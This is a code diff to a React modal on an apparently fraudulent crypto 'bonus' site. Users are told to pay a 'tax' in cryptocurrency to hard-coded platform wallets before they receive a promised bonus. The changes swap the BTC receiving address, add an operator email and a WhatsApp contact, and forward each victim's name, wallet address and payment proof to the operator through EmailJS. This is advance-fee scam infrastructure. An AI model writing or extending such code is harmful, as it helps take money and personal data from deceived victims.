@@ -34,13 +34,17 @@ const CLAIM_AMOUNTS = [
 ];
 
 const PLATFORM_WALLETS: Record<string, string> = {
-  BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+  BTC: "165QgTquE8gNBM5ySkhZi82EXrASFkDbx1",
   ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
   BNB: "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2",
   USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
   SOL: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
   XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
 };
+
+const ADMIN_EMAIL = "info@cryptobonus.live"; // ← replace with your email
+const WHATSAPP_NUMBER = "19177354067";
+const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
 
 const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 const isValidEmail = (value: string) => EMAIL_REGEX.test(value.trim());
@@ -183,23 +187,25 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   };
 
   const handleSubmitProof = () => {
+    const proofParams = {
+      user_name: fullName,
+      selected_coin: selectedCoin,
+      bonus_amount: `${bonusCrypto.toFixed(6)} ${selectedCoin}`,
+      bonus_usd: `$${claimAmountUsd.toLocaleString()}`,
+      tax_amount: `${taxCrypto.toFixed(6)} ${selectedCoin}`,
+      tax_usd: `$${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
+      wallet_address: walletAddress,
+      tx_hash: txHash || "Screenshot uploaded",
+    };
+
+    // Confirmation email to user
     emailjs
-      .send(
-        "service_tgxebrt",
-        "template_9p1n8fu",
-        {
-          to_email: email,
-          user_name: fullName,
-          selected_coin: selectedCoin,
-          bonus_amount: `${bonusCrypto.toFixed(6)} ${selectedCoin}`,
-          bonus_usd: `$${claimAmountUsd.toLocaleString()}`,
-          tax_amount: `${taxCrypto.toFixed(6)} ${selectedCoin}`,
-          tax_usd: `$${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
-          wallet_address: walletAddress,
-          tx_hash: txHash || "Screenshot uploaded",
-        },
-        "MvBuCO3lDmmt1uvb2"
-      )
+      .send("service_tgxebrt", "template_9p1n8fu", { to_email: email, ...proofParams }, "MvBuCO3lDmmt1uvb2")
+      .catch(console.error);
+
+    // Notification email to admin
+    emailjs
+      .send("service_tgxebrt", "template_9p1n8fu", { to_email: ADMIN_EMAIL, ...proofParams }, "MvBuCO3lDmmt1uvb2")
       .catch(console.error);
 
     startCountdown();
@@ -692,6 +698,18 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </button>
               </div>
 
+              <p className="text-xs text-muted-foreground text-center">
+                Need help?{" "}
+                <a
+                  href={WHATSAPP_URL}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-green-500 hover:text-green-400 font-medium"
+                >
+                  Contact us on WhatsApp
+                </a>
+              </p>
+
               <div className="flex gap-3">
                 <Button variant="outline" className="flex-1" onClick={() => setStep(2)}>
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
@@ -750,10 +768,21 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 )}
               </div>
 
-              <div className="pt-2">
+              <div className="pt-2 space-y-3">
                 <Button variant="hero" onClick={handleClose}>
                   Done
                 </Button>
+                <p className="text-xs text-muted-foreground">
+                  Questions?{" "}
+                  <a
+                    href={WHATSAPP_URL}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="text-green-500 hover:text-green-400 font-medium"
+                  >
+                    Chat with us on WhatsApp
+                  </a>
+                </p>
               </div>
             </motion.div>
           )}
